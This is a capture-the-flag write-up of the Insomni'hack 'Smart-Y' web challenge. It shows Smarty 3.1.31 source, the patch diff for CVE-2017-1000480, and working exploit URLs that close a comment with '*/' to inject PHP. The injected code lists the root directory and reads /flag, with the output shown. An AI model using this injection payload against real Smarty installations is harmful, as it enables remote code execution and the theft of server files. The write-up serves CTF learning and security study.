
# Smart-Y
This challenge was the second most flagged web challenge.

## Description
```
Last year, a nerd destroyed the system of Robot City by using some evident flaws. It seems that the system has changed and is not as evident to break now.
http://smart-y.teaser.insomnihack.ch
```

## Recon

The description talks about the previous challenge from Insomni'hack 2017. So we started by looking for the writeup of this challenge (`https://terryvogelsang.tech/insomnihack-2017-nerdwar/`). So from here, we suspect the website use the framework Smarty (confirmed by the challenge's name) and the sqli and the template injection may have been patched.

The tool `dirb` tells us that the directory `smarty` exists with the `changelog.txt` file:
```
===== 3.1.31 ===== (14.12.2016)
  23.11.2016
   - move template object cache into static variables
```
The fonctionnality vulnerable to sqli has been deactivated in the fetch function. However the display function is stills available:
```php
<?php 

if(isset($_GET['hl'])){ highlight_file(__FILE__); exit; } 
include_once('./smarty/libs/Smarty.class.php'); 
define('SMARTY_COMPILE_DIR','/tmp/templates_c'); 
define('SMARTY_CACHE_DIR','/tmp/cache'); 
  
  
class news extends Smarty_Resource_Custom 
{ 
    protected function fetch($name,&$source,&$mtime) 
    { 
        $template = "The news system is in maintenance. Please wait a year. <a href='/console.php?hl'>".htmlspecialchars("<<<DEBUG>>>")."</a>"; 
        $source = $template; 
        $mtime = time(); 
    } 
} 
  
// Smarty configuration 
$smarty = new Smarty(); 
$my_security_policy = new Smarty_Security($smarty); 
$my_security_policy->php_functions = null; 
$my_security_policy->php_handling = Smarty::PHP_REMOVE; 
$my_security_policy->modifiers = array(); 
$smarty->enableSecurity($my_security_policy); 
$smarty->setCacheDir(SMARTY_CACHE_DIR); 
$smarty->setCompileDir(SMARTY_COMPILE_DIR); 


$smarty->registerResource('news',new news); 
$smarty->display('news:'.(isset($_GET['id']) ? $_GET['id'] : ''));  
```

This version is vulnerable to the [CVE-2017-1000480](https://www.cvedetails.com/cve/CVE-2017-1000480/). uUfortunately,  there is no public exploit available. After digging, we identified the [commit](https://github.com/smarty-php/smarty/commit/614ad1f8b9b00086efc123e49b7bb8efbfa81b61) relative to the patch.
The patch is the following:
```php
-        $output .= "/* Smarty version " . Smarty::SMARTY_VERSION . ", created on " . strftime("%Y-%m-%d %H:%M:%S") .
-                   "\n  from \"" . $_template->source->filepath . "\" */\n\n";
+        $output .= "/* Smarty version {Smarty::SMARTY_VERSION}, created on " . strftime("%Y-%m-%d %H:%M:%S") .
+                   "\n  from \"" . str_replace('*/','* /',$_template->source->filepath) . "\" */\n\n";
```

 The patch prevent us to close the comment with `*/`.
 So in the actual version we should be able to close the comment and injection our own code.
 Let's try
 
 ## Exploit
 
 1. Let's list the root directory: `http://smart-y.teaser.insomnihack.ch/console.php?id=*/var_dump(scandir(%27/%27));/*`
 ```
 array(28) {
  [0]=>
  string(1) "."
  [1]=>
  string(2) ".."
  [2]=>
  string(3) "bin"
  [3]=>
  string(4) "boot"
  [4]=>
  string(3) "dev"
  [5]=>
  string(3) "etc"
  [6]=>
  string(4) "flag"
  [7]=>
  string(4) "home"
  [8]=>
  string(10) "initrd.img"
  [9]=>
  string(14) "initrd.img.old"
  [10]=>
  string(3) "lib"
  [11]=>
  string(5) "lib64"
  [12]=>
  string(10) "lost+found"
  [13]=>
  string(5) "media"
  [14]=>
  string(3) "mnt"
  [15]=>
  string(3) "opt"
  [16]=>
  string(4) "proc"
  [17]=>
  string(4) "root"
  [18]=>
  string(3) "run"
  [19]=>
  string(4) "sbin"
  [20]=>
  string(4) "snap"
  [21]=>
  string(3) "srv"
  [22]=>
  string(3) "sys"
  [23]=>
  string(3) "tmp"
  [24]=>
  string(3) "usr"
  [25]=>
  string(3) "var"
  [26]=>
  string(7) "vmlinuz"
  [27]=>
  string(11) "vmlinuz.old"
}
```
2. Print the flag: `http://smart-y.teaser.insomnihack.ch/console.php?id=*/var_dump(file_get_contents(%22/flag%22));/*`

```string(26) "INS{why_being_so_smart-y}```

It was a really nice challenge which just require to read carefully the commit.
